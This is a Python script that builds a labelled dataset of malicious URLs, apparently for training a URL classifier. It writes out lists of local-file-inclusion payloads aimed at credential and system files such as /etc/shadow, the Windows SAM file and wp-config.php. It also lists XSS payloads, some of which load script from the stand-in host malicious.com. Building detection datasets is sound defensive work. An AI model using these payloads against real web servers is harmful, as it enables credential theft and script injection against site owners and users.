import pandas as pd
import urllib.parse
import random

# Load existing dataset
csv_file_path = "./malicious_phish.csv"
df_existing = pd.read_csv(csv_file_path)

# Read domains from the provided file
domain_file_path = "./opendns-random-domains.txt"
with open(domain_file_path, "r") as file:
    domains = [line.strip() for line in file.readlines() if line.strip()]

# Different vulnerable endpoints (expanded to more web technologies)
vuln_endpoints = [
    "index.php", "view.php", "page.php", "load.php", "download.php",
    "config.php", "file.php", "shell.php", "admin.php", "include.php",
    "index.html", "view.html", "load.html", "download.html",
    "index.asp", "page.asp", "load.asp", "view.asp", "config.asp",
    "index.aspx", "view.aspx", "download.aspx", "load.aspx",
    "index.jsp", "view.jsp", "config.jsp", "page.jsp",
    "index.cgi", "load.cgi", "view.cgi",
    "index.pl", "view.pl", "load.pl",
    "index.do", "view.do", "load.do"
]

# LFI attack payloads (real-world examples)
lfi_payloads = [
    "../../../../etc/passwd", "../../../../etc/shadow",
    "../../../../boot.ini", "../../../../windows/win.ini",
    "../../../../windows/system32/config/sam",
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../etc/shadow",
    "../../../../../../../../../../etc/group",
    "../../../../../../../../../../etc/hostname",
    "../../../../../../../../../../proc/self/environ",
    "../../../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../../../var/log/nginx/error.log",
    "../../../../../../../../../../usr/local/apache/logs/access_log",
    "../../../../../../../../../../usr/local/apache/logs/error_log",
    "../../../../../../../../../../var/log/auth.log",
    "../../../../../../../../../../root/.bash_history",
    "../../../../../../../../../../home/user/.bash_history",
    "../../../../../../../../../../var/lib/mlocate/mlocate.db",
    "../../../../../../../../../../etc/network/interfaces",
    "../../../../../../../../../../etc/hosts",
    "../../../../../../../../../../etc/resolv.conf",
    "../../../../../../../../../../etc/nsswitch.conf",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://input",
    "data://text/plain;base64,UEhQIGVycm9y",
    "/proc/self/cmdline",
    "/proc/self/environ",
    "/var/www/html/index.php",
    "/var/www/html/wp-config.php",
    "/var/www/html/.htaccess",
    "/var/www/html/phpinfo.php",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log"
]  # Add more to reach 200 if necessary

# XSS attack payloads (real-world examples)
xss_payloads = [
    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>", "<iframe src=javascript:alert('XSS')>",
    "javascript:alert('XSS')", "\" onmouseover=alert('XSS')",
    "' onerror=alert('XSS')", "</script><script>alert('XSS')</script>",
    "<body onload=alert('XSS')>", "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>",
    "<a href=javascript:alert('XSS')>Click here</a>",
    "<input type=text value=\"XSS\" onfocus=alert(1)>",
    "<form><button formaction=javascript:alert('XSS')>Click</button></form>",
    "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<object data=javascript:alert('XSS')>",
    "<video><source onerror=alert('XSS')></video>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
    "<details open ontoggle=alert('XSS')>",
    "<b onmouseover=alert('XSS')>Hover here</b>",
    "<blink onclick=alert('XSS')>Click me</blink>",
    "<link rel=stylesheet href=javascript:alert('XSS')>",
    "<table background=javascript:alert('XSS')>",
    "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=>",
    "<!--[if gte IE 4]><script>alert('XSS')</script><![endif]-->",
    "‘;alert(String.fromCharCode(88,83,83))//",
    "<xss style=expression(alert('XSS'))>",
    "<div style=background:url(javascript:alert('XSS'))>",
    "<style>@import'javascript:alert(1)';</style>",
    "<script src='http://malicious.com/xss.js'></script>",
    "<!--'\"--><script>alert('XSS')</script>",
    "<script>document.write('<iframe src=\"http://malicious.com/xss.html\"></iframe>')</script>"
]  # Add more to reach 200 if necessary

# Generate attack URLs
new_data = []
total_new_urls = 2500


for domain in domains:

    if(total_new_urls>0):
        vuln_file = random.choice(vuln_endpoints)  # Randomly select different vulnerable files
        
        for lfi in lfi_payloads:
            url = f"http://{domain}/{vuln_file}?file={urllib.parse.quote(lfi)}"
            new_data.append([url, "lfi"])

        for xss in xss_payloads:
            url = f"http://{domain}/{vuln_file}?param={urllib.parse.quote(xss)}"
            new_data.append([url, "xss"])

        total_new_urls -= 1
    else:
        break

# Convert to DataFrame and append to the existing dataset
df_new = pd.DataFrame(new_data, columns=["url", "type"])
df_combined = pd.concat([df_existing, df_new], ignore_index=True)

# Shuffle the dataset randomly
df_combined = df_combined.sample(frac=1).reset_index(drop=True)

# Save the updated dataset
updated_csv_path = "./malicious_phish3.csv"
df_combined.to_csv(updated_csv_path, index=False)

# Print the number of new lines added
print(f"Total new malicious URLs generated and added: {total_new_urls}")
print(f"Updated dataset saved to {updated_csv_path}")
